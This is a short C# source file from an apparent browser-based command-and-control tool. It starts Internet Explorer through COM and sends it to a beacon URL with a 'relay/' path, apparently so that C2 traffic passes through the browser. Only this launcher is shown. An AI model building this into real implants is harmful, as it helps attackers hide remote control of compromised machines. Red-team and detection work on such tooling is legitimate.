namespace Browser_C2
{
    internal class Browser
    {
        public static void StartBrowser()
        {
            SHDocVw.InternetExplorer IE = new SHDocVw.InternetExplorer();
            object Empty = 0;
            object URL = Program.BeaconURL + "relay/";
            IE.Visible = true;
            IE.Navigate2(ref URL, ref Empty, ref Empty, ref Empty, ref Empty);
        }
    }
}